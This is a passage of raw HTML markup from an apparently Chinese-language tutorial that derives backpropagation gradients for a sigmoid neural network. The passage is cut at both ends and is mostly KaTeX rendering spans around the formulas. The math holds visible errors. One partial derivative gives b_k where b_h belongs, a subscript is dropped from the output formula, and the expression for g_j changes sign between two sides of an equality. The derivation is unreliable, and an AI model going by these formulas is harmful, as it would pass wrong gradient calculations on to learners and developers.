mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:-0.05764em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7213999999999998em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.7986599999999997em;vertical-align:-0.5423199999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2563399999999998em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.05278em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.60742em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord accent mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="accent-body" style="left:-0.19444em;"><span class="mtight">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9270285714285713em;"><span style="top:-2.214em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.42488571428571426em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423199999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.474536em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.993428em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.50732em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.05278em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>$</p></li><li><p>由于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>β</mi><mi>j</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>h</mi><mo>=</mo><mn>1</mn></mrow><mi>q</mi></msubsup><mrow><msub><mi>w</mi><mrow><mi>h</mi><mi>j</mi></mrow></msub><msub><mi>b</mi><mi>h</mi></msub></mrow></mrow><annotation encoding="application/x-tex">\beta_j=\sum^{q}_{h=1}{w_{hj}b_h}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029000000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span>，可得到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi>β</mi><mi>j</mi></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>w</mi><mrow><mi>h</mi><mi>j</mi></mrow></msub></mrow></mfrac><mo>=</mo><msub><mi>b</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">\frac{\partial \beta_j}{\partial w_{hj}}=b_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.5415079999999999em;vertical-align:-0.5480799999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.993428em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:-0.02691em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29011428571428566em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.50732em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.05278em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5480799999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。<br />Sigmoid函数有以下性质：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f&#x27;(x)=f(x)(1-f(x))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>，所以 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>j</mi><mi>k</mi></msubsup><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>β</mi><mo>−</mo><msub><mi>θ</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{y}^k_j=f(\beta-\theta_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2438799999999999em;vertical-align:-0.394772em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>g</mi><mi>j</mi></msub><mo>=</mo><mo>−</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi>E</mi><mi>k</mi></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>j</mi><mi>k</mi></msubsup></mrow></mfrac><mo>⋅</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>j</mi><mi>k</mi></msubsup></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>θ</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><mo>−</mo><mo stretchy="false">(</mo><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>j</mi><mi>k</mi></msubsup><mo>−</mo><msubsup><mi>y</mi><mi>j</mi><mi>k</mi></msubsup><mo stretchy="false">)</mo><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><msub><mi>β</mi><mi>j</mi></msub><mo>−</mo><msub><mi>θ</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>j</mi><mi>k</mi></msubsup><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>j</mi><mi>k</mi></msubsup><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>j</mi><mi>k</mi></msubsup><mo>−</mo><msubsup><mi>y</mi><mi>j</mi><mi>k</mi></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g_j=-\frac{\partial E_k}{\partial \hat{y}^k_j} \cdot \frac{\partial \hat{y}^k_j}{\partial \theta_j}=-(\hat{y}^k_j-y^k_j)f&#x27;(\beta_j-\theta_j)=\hat{y}^k_j(1-\hat{y}^k_j)(\hat{y}^k_j-y^k_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.6233679999999997em;vertical-align:-0.7213999999999998em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9019679999999999em;"><span style="top:-2.60142em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord accent mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="accent-body" style="left:-0.19444em;"><span class="mtight">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8408285714285714em;"><span style="top:-2.177714285714286em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.46117142857142857em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.41586em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:-0.05764em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7213999999999998em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.7986599999999997em;vertical-align:-0.5423199999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2563399999999998em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.02778em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.60742em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord accent mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="accent-body" style="left:-0.19444em;"><span class="mtight">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9270285714285713em;"><span style="top:-2.214em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.42488571428571426em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423199999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2438799999999999em;vertical-align:-0.394772em;"></span><span class="mord">−</span><span class="mopen">(</span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2438799999999999em;vertical-align:-0.394772em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span 